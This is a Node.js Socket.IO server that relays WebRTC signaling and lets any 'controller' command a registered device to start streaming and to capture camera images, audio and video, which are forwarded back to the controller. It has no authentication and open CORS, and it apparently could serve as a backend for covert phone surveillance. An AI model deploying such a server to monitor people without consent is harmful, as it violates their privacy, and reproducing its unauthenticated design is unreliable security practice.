// Node.js WebRTC Signaling Server (LEGACY - use /node-backend/ for new deploys)
// This file kept for backward compatibility
// Redirect to new backend
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'Use /node-backend/ for new setup. See README.md' });
});
app.get('/health', (req, res) => res.json({ status: 'ok' }));

const rooms = {};
const deviceSockets = {};

io.on('connection', (socket) => {
  socket.on('register-device', (data) => {
    const deviceId = data.deviceId || socket.id;
    deviceSockets[deviceId] = socket.id;
    rooms[socket.id] = { type: 'device', deviceId };
    socket.join(`device_${deviceId}`);
    io.emit('device-list-update', Object.keys(deviceSockets));
  });
  socket.on('join-as-controller', (data) => {
    rooms[socket.id] = { type: 'controller' };
    socket.join(`ctrl_${data.deviceId}`);
    io.to(`device_${data.deviceId}`).emit('start-stream', { controllerId: socket.id });
  });
  socket.on('offer', (data) => io.to(data.to).emit('offer', { sdp: data.sdp, from: socket.id }));
  socket.on('answer', (data) => io.to(data.to).emit('answer', { sdp: data.sdp, from: socket.id }));
  socket.on('ice-candidate', (data) => io.to(data.to).emit('ice-candidate', { candidate: data.candidate, from: socket.id }));
  socket.on('capture-image', (data) => io.to(`device_${data.deviceId}`).emit('capture-image', { camera: data.camera || 'front' }));
  socket.on('capture-audio', (data) => io.to(`device_${data.deviceId}`).emit('capture-audio', { duration: data.duration || 10 }));
  socket.on('capture-video', (data) => io.to(`device_${data.deviceId}`).emit('capture-video', { duration: data.duration || 15, camera: data.camera || 'back' }));
  socket.on('media-captured', (data) => io.to(`ctrl_${data.deviceId}`).emit('media-ready', data));
  socket.on('disconnect', () => {
    for (const [did, sid] of Object.entries(deviceSockets)) {
      if (sid === socket.id) { delete deviceSockets[did]; io.emit('device-list-update', Object.keys(deviceSockets)); break; }
    }
    delete rooms[socket.id];
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server on port ${PORT}`));
